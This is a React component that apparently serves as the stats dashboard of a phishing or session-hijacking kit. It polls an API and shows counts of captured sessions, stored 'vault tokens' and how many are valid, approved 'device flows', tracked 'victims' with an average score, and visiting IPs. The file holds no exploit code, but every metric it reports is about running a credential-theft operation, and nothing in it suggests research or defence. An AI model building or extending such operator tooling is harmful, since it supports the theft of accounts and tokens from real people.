'use client';

import { useEffect, useState } from 'react';
import { getStatus, getVisitStats, getVaultStats, getDeviceStats, getCRMStats } from '@/lib/api';

interface StatsData {
  sessions: number;
  lastCapture: string | null;
  visits: number;
  uniqueIPs: number;
  todayVisits: number;
  vaultTokens: number;
  vaultValid: number;
  devicePending: number;
  deviceApproved: number;
  victims: number;
  victimScore: number;
  campaigns: number;
}

export function Stats() {
  const [stats, setStats] = useState<StatsData>({
    sessions: 0,
    lastCapture: null,
    visits: 0,
    uniqueIPs: 0,
    todayVisits: 0,
    vaultTokens: 0,
    vaultValid: 0,
    devicePending: 0,
    deviceApproved: 0,
    victims: 0,
    victimScore: 0,
    campaigns: 0,
  });
  const [loading, setLoading] = useState(true);

  const fetchStats = async () => {
    try {
      const [statusRes, visitsRes, vaultRes, deviceRes, crmRes] = await Promise.all([
        getStatus(),
        getVisitStats(),
        getVaultStats(),
        getDeviceStats(),
        getCRMStats().catch(() => ({ data: { stats: {} } })),
      ]);

      setStats({
        sessions: statusRes.data.totalSessions || 0,
        lastCapture: statusRes.data.lastCapture || null,
        visits: visitsRes.data.total || 0,
        uniqueIPs: visitsRes.data.uniqueIPs || 0,
        todayVisits: visitsRes.data.today || 0,
        vaultTokens: vaultRes.data.stats?.total || 0,
        vaultValid: vaultRes.data.stats?.valid || 0,
        devicePending: deviceRes.data.stats?.pending || 0,
        deviceApproved: deviceRes.data.stats?.approved || 0,
        victims: crmRes.data.stats?.total || 0,
        victimScore: Math.round(crmRes.data.stats?.avg_score || 0),
        campaigns: 0,
      });
    } catch (error) {
      console.error('Failed to fetch stats:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchStats();
    const interval = setInterval(fetchStats, 15000);
    return () => clearInterval(interval);
  }, []);

  if (loading) {
    return (
      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
        {[...Array(8)].map((_, i) => (
          <div key={i} className="glass p-4 animate-pulse">
            <div className="h-3 w-16 bg-white/5 rounded mb-2" />
            <div className="h-8 w-12 bg-white/5 rounded" />
          </div>
        ))}
      </div>
    );
  }

  const statCards = [
    { label: 'Sessions', value: stats.sessions, sub: 'Total captured' },
    { label: 'Visits', value: stats.visits, sub: `${stats.todayVisits} today` },
    { label: 'Unique IPs', value: stats.uniqueIPs, sub: 'Unique visitors' },
    { label: 'Vault Tokens', value: stats.vaultTokens, sub: `${stats.vaultValid} valid` },
    { label: 'Device Flows', value: stats.devicePending, sub: `${stats.deviceApproved} approved` },
    { label: 'Victims', value: stats.victims, sub: `Avg score: ${stats.victimScore}` },
    { label: 'Last Capture', value: stats.lastCapture ? new Date(stats.lastCapture).toLocaleDateString() : 'Never', sub: 'Latest session' },
  ];

  return (
    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-7 gap-4">
      {statCards.map((card) => (
        <div key={card.label} className="glass p-4">
          <label className="text-[10px] uppercase tracking-wider text-white/40">
            {card.label}
          </label>
          <div className="text-2xl font-bold text-transparent bg-gradient-to-r from-white to-blue-300 bg-clip-text">
            {card.value}
          </div>
          <div className="text-xs text-white/30 mt-1">{card.sub}</div>
        </div>
      ))}
    </div>
  );
}
